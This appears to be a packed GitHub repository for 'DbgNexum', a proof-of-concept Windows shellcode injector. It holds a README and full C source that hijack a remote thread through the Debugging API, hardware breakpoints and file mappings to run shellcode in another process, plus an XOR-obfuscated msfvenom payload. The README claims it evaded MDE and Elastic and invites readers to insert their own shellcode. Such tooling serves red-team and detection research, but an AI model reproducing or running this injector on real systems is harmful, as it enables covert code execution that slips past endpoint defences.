@@ -1,0 +1,448 @@
+Project Path: arc_dis0rder0x00_DbgNexum_wxu5xual
+
+Source Tree:
+
+```txt
+arc_dis0rder0x00_DbgNexum_wxu5xual
+├── LICENSE
+├── README.md
+├── main.c
+└── shellcode.h
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026 dis0rder0x00
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`README.md`:
+
+```md
+# DbgNexum - Shellcode Injection
+
+**DbgNexum** is a Proof-of-Concept for injecting shellcode using the Windows Debugging API and Shared Memory (File Mapping). It avoids writing and reading remote memory directly, instead using context manipulation to force the target process to load and execute the payload itself.
+
+## Overview
+The injector attaches to a target process and creates a suspended thread. Through a debug loop, it sets a Hardware Breakpoint to trap execution at a specific return address. At each trap, the injector modifies the CPU registers to mimic function calls, orchestrating a sequence of Windows API function calls inside of the target process. 
+
+> At the time of writing this README, I tested the technique against MDE and Elastic, neither of which detected it.
+
+### Key Features
+- **No `WriteProcessMemory` / `VirtualAllocEx`:** The payload is transferred via `CreateFileMapping` and `MapViewOfFile`.
+- **No `ReadProcessMemory`:** The approach gets all the key information from the thread context.
+
+## Usage
+> The PoC uses an XORed msfvenom shellcode that spawns "calc.exe". But please use your own shellcode!
+
+1. Include your shellcode (and XOR key) in `shellcode.h`
+2. Find the Process ID of the target.
+3. Run the injector:
+
+```cmd
+DbgNexum.exe <PID>
+```
+
+**Example Output:**
+
+```text
+[i] Section 'MZ' created and shellcode copied
+[+] Bait thread created. Setting HWBP on FileTimeToSystemTime
+[i] Execution Redirected:
+|-> [0] Preparation & anchoring stack
+|-> [1] Setting HWBP & buffer alloc
+|-> [2] Copying File-Mapping name
+|-> [3] Zeroing stack slot
+|-> [4] Opening handle to named file mapping
+|-> [5] Mapping payload into mem. with exec. perm.
+|-> [6] Cleanup & shellcode execution
+[+] Successfully detached from process 19256
+[i] Orchestration complete.
+```
+
+## How It Works
+The execution flow is a constant back and forth between the injector's Debug Loop and the target process.
+
+**Injection Stages**
+
+The `DebugLoop` function contains the main injection logic and orchestrates the "state machine":
+
+**0. Preparation:**
+- The injector saves the current stack pointer to reuse for each stage
+- To get the return address of the anchored stack, we set a trap flag and set execution to an instant `ret` call.
+
+**1. Allocation:**
+- Set HWBP on the return address of the anchored stack, to get notified when a called function returns.
+- Prepare and force thread to call `LocalAlloc` to (obviously) allocate a small buffer.
+
+**2. Data Setup:**
+- Prepare and force thread to call `memcpy` to copy the string `MZ` into the previously allocated buffer.
+
+**3. Stack Prep:**
+- Force thread to call `memset` to zero out a stack slot. This is in preparation of stage 5, which will call `MapViewOfFile`. Since the function will use >4 arguments, the 5th arg is passed via the stack (which we set here).
+
+**4. Open Mapping:**
+- Force thread to call `OpenFileMappingA` using the `MZ` name, "created" in stage 2 & 3.
+
+**5. Map Payload:**
+- Forces the target to call `MapViewOfFile`. This maps the shared memory section (containing the shellcode) into the target's address space with `EXECUTE` permissions.
+
+**6. Execution:**
+- Redirects `RIP` to the address returned by `MapViewOfFile`.
+- Clears debug registers and detaches.
+```
+
+`main.c`:
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <psapi.h>
+#include <ntdef.h>
+
+#include "shellcode.h"
+
+#define SECTION_NAME "MZ"
+// #define DEBUG
+
+#ifdef DEBUG
+    #define DBG_PRINT(fmt, ...) \
+    do { fprintf(stderr, "[DBG] " fmt, ##__VA_ARGS__); } while (0)
+#else
+    #define DBG_PRINT(fmt, ...) do { } while (0)
+#endif
+
+// global initialization
+HANDLE  g_hTargetProcess = NULL;
+HANDLE  g_hTargetThread = NULL;
+DWORD   g_dwThreadId = 0;
+
+#pragma optimize("", off)
+void xor_decrypt(unsigned char *data, const size_t data_len, const unsigned char *key, const size_t key_len) {
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
+#pragma optimize("", on)
+
+void DebugLoop(void) {
+    DEBUG_EVENT de;
+    int stage = 0;
+    HANDLE  hRemoteHandle = NULL;
+    DWORD64 dw64MzStringCopy = 0;
+    DWORD64 dw64SavedRsp = 0;
+    DWORD64 dw64SavedRetAddr = 0;
+    DWORD64 dw64ShellcodeBase = 0;
+
+    ResumeThread(g_hTargetThread);
+
+    while (WaitForDebugEvent(&de, 10*1000)) {
+        const DWORD continueStatus = DBG_CONTINUE;
+
+        if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
+            const EXCEPTION_RECORD* er = &de.u.Exception.ExceptionRecord;
+
+            if (er->ExceptionCode == EXCEPTION_SINGLE_STEP && de.dwThreadId == g_dwThreadId) {
+
+                CONTEXT ctx = { 0 };
+                ctx.ContextFlags = CONTEXT_ALL;
+                GetThreadContext(g_hTargetThread, &ctx);
+
+                if (stage == 0) {
+                    printf("[i] Execution Redirected:\n");
+                    printf("|-> [0] Preparation & anchoring stack\n");
+
+                    // Save the stack pointer to roll back later
+                    dw64SavedRsp = ctx.Rsp;
+                    DBG_PRINT("[i] Anchoring Stack at: 0x%llx\n", dw64SavedRsp);
+
+                    // here we use DbgBreakPoint which should only be [ int3, ret ]
+                    // So by setting the trap flag and setting the Rip to DbgBreakPoint+1 (the <ret>),
+                    // the next debug event should happen at the return address of our current stack.
+                    // If we store the Rip of the next event and roll back the stack state, we know the return address without reading it directly.
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "DbgBreakPoint") + 1;
+                    ctx.EFlags |= 0x100; // Set trap flag
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+
+                    stage = 1;
+                }
+
+                else if (stage == 1) {
+                    // This stage is used as initialization of the technique
+                    // We set a HWBP as a "checkpoint" so that we get notified after a stage is done / has called a function.
+                    // After setting the HWBP we allocate memory in the target process which will hold the name of the FileMapping.
+                    printf("|-> [1] Setting HWBP & buffer alloc\n");
+
+                    // Now we have the return address of the previously saved stack state
+                    dw64SavedRetAddr = ctx.Rip;
+                    DBG_PRINT("[i] Constant Return Addr: 0x%llx\n", dw64SavedRetAddr);
+
+                    // Rollback stack
+                    ctx.Rsp = dw64SavedRsp;
+
+                    // Reset TF
+                    ctx.EFlags &= ~0x100;
+
+                    // Set HWBP on the return address of the anchored stack state
+                    ctx.Dr0 = (DWORD64)dw64SavedRetAddr;
+                    ctx.Dr7 = (1ULL << 0);       // Enable G0 (Global breakpoint 0)
+                    ctx.Dr7 &= ~(3ULL << 16);    // Execute breakpoint
+                    ctx.Dr6 = 0;                 // Clear status
+
+                    // LocalAlloc(LPTR, 3)
+                    ctx.Rcx = LPTR;
+                    ctx.Rdx = 3;
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalAlloc");
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 2;
+                }
+
+                else if (stage == 2 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
+                    // This stage simply copies the file mapping name 'MZ' into the allocated buffer
+                    // We use 'MZ', since these chars are always at the start of a PE file, so it's guaranteed to exist, and we easily know where it is.
+                    printf("|-> [2] Copying File-Mapping name\n");
+
+                    // Rax now holds the address of our allocated space
+                    dw64MzStringCopy = ctx.Rax;
+                    DBG_PRINT("[i] LocalAlloc returned:  0x%llx\n", dw64MzStringCopy);
+                    if (!dw64MzStringCopy) { printf("[!] LocalAlloc failed\n"); break; }
+
+                    // Rollback stack
+                    ctx.Rsp = dw64SavedRsp;
+
+                    // memcpy(pvMzStringCopy, <kernel32 base>, 2)
+                    ctx.Rcx = (DWORD64)dw64MzStringCopy;
+                    ctx.Rdx = (DWORD64)GetModuleHandleA("kernel32.dll");
+                    ctx.R8  = 2;
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 3;
+                }
+
+                else if (stage == 3 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
+                    // Stage 3 prepares our anchored stack for a later call.
+                    // On windows if your code calls a function, arguments 1-4 are passed via registers.
+                    // Any following arguments are passed via the stack.
+                    // So to make sure the call in stage 5 doesn't fail because of bad arguments, we prepare it here.
+                    printf("|-> [3] Zeroing stack slot\n");
+
+                    // Rollback stack
+                    ctx.Rsp = dw64SavedRsp;
+
+                    // memset(ctx.Rsp+0x28, 0, sizeof(DWORD);
+                    ctx.Rcx = ctx.Rsp+0x28;
+                    ctx.Rdx = 0;
+                    ctx.R8  = sizeof(DWORD64);
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memset");
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 4;
+                }
+
+                else if (stage == 4 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
+                    // This stage will open the File Mapping we created in the main function of this PoC.
+                    // We pass the string pointer, which we allocated and populated in the previous stages.
+                    printf("|-> [4] Opening handle to named file mapping\n");
+
+                    // Rollback stack
+                    ctx.Rsp = dw64SavedRsp;
+
+                    // OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, pvMzStringCopy)
+                    ctx.Rcx = FILE_MAP_ALL_ACCESS;
+                    ctx.Rdx = FALSE;
+                    ctx.R8  = dw64MzStringCopy;
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OpenFileMappingA");
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 5;
+                }
+
+                else if (stage == 5 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
+                    // Stage five reads from the file mapping and creates an executable section from it using MapViewOfFile.
+                    // The function uses >4 arguments, which is why we had to prepare the stack in stage 3.
+                    printf("|-> [5] Mapping payload into mem. with exec. perm.\n");
+
+                    // Rax holds the handle returned by OpenFileMappingA
+                    hRemoteHandle = (HANDLE)ctx.Rax;
+                    if (!hRemoteHandle) { printf("[!] OpenFileMappingA failed\n"); break; }
+                    DBG_PRINT("[i] FileMapping Handle: 0x%p\n", hRemoteHandle);
+
+                    // Have you listened to the new Bones (TEAM SESH) album yet?
+                    // Rollback stack
+                    ctx.Rsp = dw64SavedRsp;
+
+                    // MapViewOfFile(handle, perm, 0, 0, 0)
+                    ctx.Rcx = (DWORD64)hRemoteHandle;
+                    ctx.Rdx = FILE_MAP_EXECUTE | FILE_MAP_READ;
+                    ctx.R8 = 0; ctx.R9 = 0;
+                    // The fifth argument is passed via the stack, which we prepared to be set to 0 in stage 3.
+                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "MapViewOfFile");
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 6;
+                }
+
+                else if (stage == 6 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
+                    // Stage 6 is the actual shellcode execution. Additionally, it clears the HWBP.
+                    printf("|-> [6] Cleanup & shellcode execution\n");
+
+                    // Rax should hold the pointer to the executable section (returned by MapViewOfFile)
+                    dw64ShellcodeBase = ctx.Rax;
+                    if (!dw64ShellcodeBase) { printf("[!] MapViewOfFile failed\n"); break; }
+                    DBG_PRINT("[i] Shellcode at: 0x%llx.\n", dw64ShellcodeBase);
+
+                    ctx.Rip = (DWORD64)dw64ShellcodeBase;
+
+                    // Clear HWBP
+                    ctx.Dr0 = 0;
+                    ctx.Dr7 = 0;
+
+                    SetThreadContext(g_hTargetThread, &ctx);
+                    stage = 7;
+                }
+            }
+        }
+
+        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, continueStatus);
+        if (stage == 7) { break; }
+    }
+}
+
+int main(const int argc, char **argv) {
+    if (argc < 2) {
+        printf("[!] Usage: %s <pid>\n", argv[0]);
+        return 1;
+    }
+
+    const DWORD pid = strtol(argv[1], NULL, 10);
+
+    // First we map the shellcode into a section
+    HANDLE hSection = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), SECTION_NAME);
+    PVOID localView = MapViewOfFile(hSection, FILE_MAP_WRITE, 0, 0, 0);
+
+    // I XORed the payload for development sakes, as I used the basic msfvenom exec shellcode,
+    // and didn't want the technique to be stopped because of the shellcode signature.
+    xor_decrypt(payload, sizeof(payload), xor_key, sizeof(xor_key));
+
+    memcpy(localView, payload, sizeof(payload));
+    printf("[i] Section '%s' created and shellcode copied\n", SECTION_NAME);
+
+    g_hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!DebugActiveProcess(pid)) {
+        printf("[!] Failed to attach as debugger\n");
+        return 1;
+    }
+
+    DebugSetProcessKillOnExit(FALSE);
+
+    const void* pvArbitFunc =  GetProcAddress(GetModuleHandleA("kernel32.dll"), "FileTimeToSystemTime");
+    g_hTargetThread = CreateRemoteThread(g_hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvArbitFunc, NULL, CREATE_SUSPENDED, NULL);
+    g_dwThreadId = GetThreadId(g_hTargetThread);
+
+    printf("[+] Bait thread created. Setting HWBP on FileTimeToSystemTime\n");
+
+    // Set HWBP on the arbitrary function
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (!GetThreadContext(g_hTargetThread, &ctx)) return FALSE;
+    ctx.Dr0 = (DWORD64)pvArbitFunc;
+    ctx.Dr7 = (1ULL << 0);
+    ctx.Dr7 &= ~(3ULL << 16);
+    SetThreadContext(g_hTargetThread, &ctx);
+
+    DebugLoop(); // Main "injection" logic
+
+    if (DebugActiveProcessStop(pid)) {
+        printf("[+] Successfully detached from process %lu\n", pid);
+    } else {
+        printf("[!] Failed to detach. Target might crash\n");
+    }
+
+    printf("[i] Orchestration complete.\n");
+    return 0;
+}
+```
+
+`shellcode.h`:
+
+```h
+#ifndef DBGNEXUMINJECTION_SHELLCODE_H
+#define DBGNEXUMINJECTION_SHELLCODE_H
+
+unsigned char xor_key[] = {
+    0x47, 0xba, 0xd6, 0x45, 0xd7, 0x17, 0x79, 0x73, 0x29, 0x4b, 0xa9, 0xbf
+};
+
+// Generated with: msfvenom -f raw -o calc.bin -p windows/x64/exec EXITFUNC=thread CMD=calc.exe
+// Then XORed with a python script. Im sure you can figure out how lol
+unsigned char payload[] = {
+    0xbb, 0xf2, 0x57, 0xa1, 0x27, 0xe8, 0x86, 0x8c, 0xc1, 0x87, 0xa9, 0xbf,
+    0x47, 0xfb, 0x87, 0x04, 0x87, 0x45, 0x31, 0x42, 0xfb, 0x1a, 0xcc, 0xf7,
+    0xcc, 0xe8, 0xb6, 0x13, 0x9f, 0x9c, 0x2b, 0x6b, 0x61, 0xc0, 0xfb, 0x9f,
+    0x0a, 0x8b, 0x1f, 0x0d, 0xd8, 0xa0, 0x33, 0x39, 0x61, 0xc0, 0xdb, 0xef,
+    0x0f, 0x8b, 0x16, 0xe9, 0xeb, 0x76, 0x05, 0x71, 0x05, 0x6b, 0xe8, 0x7e,
+    0x8e, 0xb7, 0x97, 0x44, 0x16, 0xf5, 0x94, 0x21, 0x68, 0x1a, 0xe1, 0x34,
+    0x15, 0x9a, 0x5d, 0x07, 0xeb, 0x5f, 0x78, 0xa3, 0x4f, 0xca, 0xd1, 0xa7,
+    0x4c, 0xb8, 0xd9, 0xc0, 0xa5, 0x17, 0x79, 0x73, 0xa2, 0xcb, 0x21, 0xbf,
+    0x47, 0xba, 0x9e, 0xc0, 0x17, 0x63, 0x1e, 0x3b, 0x28, 0x9b, 0xf9, 0x34,
+    0x0f, 0xa2, 0x92, 0xce, 0x97, 0x37, 0x30, 0x72, 0xf9, 0xa8, 0xff, 0xf2,
+    0x76, 0x73, 0x9e, 0xba, 0x1e, 0x56, 0xf2, 0x47, 0xa1, 0x03, 0xa8, 0x69,
+    0x0f, 0x8b, 0x16, 0xe9, 0x96, 0xd6, 0xb0, 0x7e, 0x68, 0x4a, 0x68, 0x87,
+    0xa7, 0xcf, 0x27, 0x09, 0xd4, 0x5b, 0x5d, 0x7b, 0x6c, 0x72, 0x78, 0xca,
+    0x9f, 0xe2, 0x92, 0xce, 0x97, 0x33, 0x30, 0x72, 0xf9, 0x2d, 0xe8, 0x34,
+    0x4b, 0xf2, 0x92, 0xce, 0x97, 0x0b, 0x30, 0x72, 0xf9, 0x0a, 0x22, 0xbb,
+    0xcf, 0xfb, 0x8e, 0x04, 0x8f, 0x49, 0x31, 0x72, 0xf9, 0x12, 0xf3, 0xfe,
+    0x1f, 0xfb, 0x8f, 0x04, 0x8d, 0x5f, 0xfa, 0x9f, 0x09, 0x0a, 0xfb, 0x40,
+    0xa7, 0xe2, 0x97, 0x1c, 0x8d, 0x5f, 0xf2, 0x61, 0xc0, 0x00, 0x56, 0x40,
+    0xb8, 0xe7, 0x3e, 0x4e, 0xd7, 0x17, 0x79, 0x06, 0x5a, 0x2e, 0xdb, 0x8c,
+    0x75, 0x94, 0xb2, 0x29, 0xbb, 0x17, 0x20, 0x32, 0x93, 0x07, 0xde, 0x99,
+    0x40, 0x45, 0x03, 0x0c, 0x10, 0xd6, 0x79, 0x73, 0x29, 0x4b, 0x41, 0xce,
+    0x47, 0xba, 0xd6, 0x0b, 0xb2, 0x61, 0x1c, 0x01, 0x09, 0x39, 0xdc, 0xd1,
+    0x67, 0xcd, 0xb3, 0x2c, 0xa5, 0x73, 0x59, 0x10, 0x46, 0x2f, 0xcc, 0x9f,
+    0x21, 0xc8, 0xb9, 0x28, 0xf7, 0x50, 0x10, 0x07, 0x61, 0x3e, 0xcb, 0x9f,
+    0x3e, 0xd5, 0xa3, 0x65, 0xb3, 0x7e, 0x1d, 0x1d, 0x5d, 0x6b, 0xca, 0xd7,
+    0x22, 0xd9, 0xbd, 0x64, 0xf7, 0x5e, 0x14, 0x53, 0x47, 0x24, 0xde, 0x9f,
+    0x20, 0xd5, 0xb8, 0x2b, 0xb6, 0x37, 0x1b, 0x06, 0x5b, 0x25, 0x89, 0xd2,
+    0x3e, 0x9a, 0xe6, 0x21, 0xb6, 0x6e, 0x59, 0x16, 0x51, 0x3b, 0xc5, 0xd0,
+    0x2e, 0xce, 0xf6, 0x26, 0xbf, 0x76, 0x10, 0x1d, 0x09, 0x3f, 0xc6, 0x9f,
+    0x2e, 0xd4, 0xb0, 0x20, 0xb4, 0x63, 0x59, 0x0a, 0x46, 0x3e, 0xdb, 0x9f,
+    0x2f, 0xd5, 0xa5, 0x31, 0xf7, 0x38, 0x0a, 0x73, 0x73, 0xa3, 0x8d, 0xbf,
+    0x47, 0xba, 0xb2, 0x2c, 0xa4, 0x27, 0x0b, 0x17, 0x4c, 0x39, 0x89, 0xcc,
+    0x26, 0xc3, 0xa5, 0x7f, 0xf7, 0x43, 0x11, 0x12, 0x5d, 0x6c, 0xda, 0x9f,
+    0x26, 0x9a, 0xb4, 0x2c, 0xb0, 0x37, 0x16, 0x06, 0x4a, 0x23, 0x87, 0x91,
+    0x69, 0xba, 0x97, 0x1d, 0x9f, 0x26, 0xb0, 0x32, 0x93, 0x0e, 0x2a, 0xe9,
+    0x40, 0x45, 0x03, 0xfe, 0x37, 0x0a, 0x53, 0x79, 0x68, 0xf1, 0x0f, 0x2a,
+    0xfa, 0x27, 0x29, 0x90, 0x9f, 0x94, 0xbd, 0x5b, 0x15, 0x4d, 0xd5, 0xb5,
+    0xc7, 0x41, 0x36, 0x30, 0xd2, 0xac, 0x3e, 0x60, 0x5b, 0x24, 0xc3, 0xbf,
+    0x1e, 0xfb, 0x5f, 0x9f, 0x28, 0xc2
+};
+
+#endif //DBGNEXUMINJECTION_SHELLCODE_H
+```
